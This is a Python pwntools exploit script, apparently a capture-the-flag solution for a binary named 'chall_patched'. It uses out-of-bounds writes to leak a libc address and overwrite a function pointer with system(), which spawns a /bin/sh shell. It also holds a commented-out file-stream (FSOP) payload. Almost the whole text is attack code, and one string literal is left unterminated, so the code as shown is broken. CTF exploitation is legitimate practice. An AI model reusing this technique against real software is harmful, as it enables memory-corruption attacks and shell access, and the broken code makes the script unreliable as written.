from pwn import *
from subprocess import check_output
import sys
import os

_path = "./chall_patched"
context.binary = exe = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 1337
cmd = f'''
    set max-visualize-chunk-size 0x500
    set solib-search-path {os.getcwd()}
    decompiler connect ida --host localhost --port 3662
    # b*0x40157A
    continue
    # b*0x4015D5 
    b*0x4014BE
    # b*0x4012B5
    # b*0x401605
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
    
    if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]), ssl=True)
    return p

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data, _arch = 64, endian = 'little'):
    switcher = {
        64: p64(_data & 0xffffffffffffffff, endian),
        32: p32(_data & 0xffffffff, endian),
        16: p16(_data & 0xffff, endian),
        8:  p8(_data & 0xff, endian)
    }
    return switcher[_arch]

chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def point(x, y, val):
    sla(b"> ", b"p")
    sl(str(x))
    sl(str(y))
    sl(str(hex(val)))

def reset(x, y):
    sla(b"> ", b"r")
    sl(str(x))
    sl(str(y))
count = 0
def main():
    reset(40, 40)
    todo = [0x80, 0x40, 0x40, 0]
    for i in range(len(todo)):
        point(0, (-0x1300+i), todo[i])
    reset(8, 1)
    reset(1, 1)
    reset(10, 10)
    reset(20, 20)
    write = [0xe0, 0x10, 0x40, 0, 0, 0] # puts[plt]
    for i in range(len(write)):
        point(0, (-0x80+i), write[i])
    reset(16, 8)
    reset(4, 4)
    chall.recvuntil(b"........")
    leak = u64(chall.recv(6).ljust(8, b"\00"))
    libc.address = leak - libc.sym.main_arena - 96
    log.info(f"leaking: {hex(libc.address)}")
    write = [0x80, 0x40, 0x40, 0]
    for i in range(len(write)):
        point(0, (-0x13c0+i), write[i])
    reset(1, 1)
    sh = "/bin/sh\00
    for i in range(len(sh)):
        point(0, i, ord(sh[i])) 
    system = libc.sym.system
    for i in range(8):
        point(0, (-0x80+i), ((system >> 8*i) & 0xff))
    reset(1, 0x68)
    check()

if __name__ == "__main__":
    main()
